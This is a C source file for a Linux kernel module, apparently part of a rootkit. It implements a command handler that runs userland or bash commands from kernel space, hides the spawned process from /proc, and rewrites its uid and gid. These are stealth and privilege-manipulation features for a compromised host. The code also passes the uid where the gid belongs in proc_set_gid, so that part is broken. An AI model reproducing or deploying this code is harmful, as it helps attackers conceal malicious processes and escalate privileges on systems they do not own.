#include <linux/kernel.h>
#include <linux/uidgid.h>
#include <linux/slab.h>
#include <asm-generic/errno-base.h>
#include <stdbool.h>

#include "command/exec.h"
#include "lib/ketopt.h"
#include "userland_exec.h"
#include "proc_hide.h"
#include "proc_uidgid.h"
#include "log.h"

enum { opt_exec_bash, opt_exec_hide, opt_exec_uid, opt_exec_gid };

const static ko_longopt_t longopts[] = {
	{ "bash", ko_no_argument, opt_exec_bash },
	{ "hide", ko_no_argument, opt_exec_hide },
	{ "uid", ko_required_argument, opt_exec_uid },
	{ "gid", ko_required_argument, opt_exec_gid },
	{ NULL, 0, 0 }
};

static char *strjoin(char **str, size_t n, char *delim);
static int user_exec_wrapper(size_t nargs, char **args, pid_t *pid);
static int proc_hide_wrapper(pid_t pid);

/** strjoin() - Concat string arrays into a single string.
 * @str: input string array.
 * @n: number of elements in @str.
 * @delim: delimiter
 *
 * The output string is always null-terminated.
 *
 * Return: NULL if allocation failure or @n == 0, concatenated string otherwise.
 */
static char *strjoin(char **str, size_t n, char *delim)
{
	int i;
	size_t len = 1;
	char *s = NULL;

	if (n == 0)
		return NULL;

	for (i = 0; i < n; i++) {
		len += strlen(str[i]);
		if (i != n - 1)
			len += strlen(delim);
	}

	s = kmalloc(len * sizeof(char), GFP_KERNEL);
	if (!s)
		return NULL;

	/* For strcat to work there must be an existing NULL terminator. */
	*s = '\0';

	for (i = 0; i < n; i++) {
		strcat(s, str[i]);
		if (i != n - 1)
			strcat(s, delim);
	}

	return s;
}

static int user_exec_wrapper(size_t nargs, char **args, pid_t *pid)
{
	char **exec_argv = kmalloc((nargs + 1) * sizeof(char *), GFP_KERNEL);
	int i;
	if (!exec_argv)
		return -ENOMEM;

	for (i = 0; i < nargs; i++)
		exec_argv[i] = args[i];

	exec_argv[nargs] = NULL;
	*pid = user_exec(exec_argv);

	kfree(exec_argv);

	return 0;
}

static int proc_hide_wrapper(pid_t pid)
{
	int ret = 0;
	int len = snprintf(NULL, 0, "%d", pid);
	char *proc_name = kmalloc((len + 1) * sizeof(char), GFP_KERNEL);
	if (!proc_name)
		return -ENOMEM;

	snprintf(proc_name, len + 1, "%d", pid);

	ret = proc_hide_add(proc_name);

	kfree(proc_name);
	return ret;
}

int exec_handler(int argc, char **argv)
{
	ketopt_t o = KETOPT_INIT;
	int err = 0;
	int ret;
	int c;

	int pid;
	uid_t uid;
	gid_t gid;
	bool set_uid = false;
	bool set_gid = false;
	bool bash = false;
	bool hide = false;
	char *cmd = NULL;

	while ((c = ketopt(&o, argc, argv, 1, "", longopts)) >= 0) {
		switch (c) {
		case opt_exec_bash:
			bash = true;
			break;
		case opt_exec_hide:
			hide = true;
			break;
		case opt_exec_uid:
			if (o.arg) {
				ret = kstrtou32(o.arg, 10, &uid);
				set_uid = true;
				if (ret)
					return ret;
			} else {
				err++;
			}
			break;
		case opt_exec_gid:
			if (o.arg) {
				ret = kstrtou32(o.arg, 10, &gid);
				set_gid = true;
				if (ret)
					return ret;
			} else {
				err++;
			}
			break;
		}
	}

	if (o.ind == argc) {
		IMLOG_WARNING("Command not supplied\n");
		return -EINVAL;
	}

	if (bash) {
		cmd = strjoin(&argv[o.ind], argc - o.ind, " ");
		if (!cmd)
			return -ENOMEM;
		pid = bash_exec(cmd);
		kfree(cmd);
		if (pid < 0) {
			IMLOG_WARNING("Task execution unsuccessful\n");
			return pid;
		}
	} else {
		ret = user_exec_wrapper(argc - o.ind, &argv[o.ind], &pid);
		if (ret < 0) {
			IMLOG_WARNING("Task execution unsuccessful\n");
			return ret;
		}

		IMLOG_INFO("Process executed successfully, pid: %d\n", pid);
		if (hide)
			proc_hide_wrapper(pid);

		if (set_uid)
			proc_set_uid(pid, uid);

		if (set_gid)
			proc_set_gid(pid, uid);
	}

	return err ? -EINVAL : 0;
}
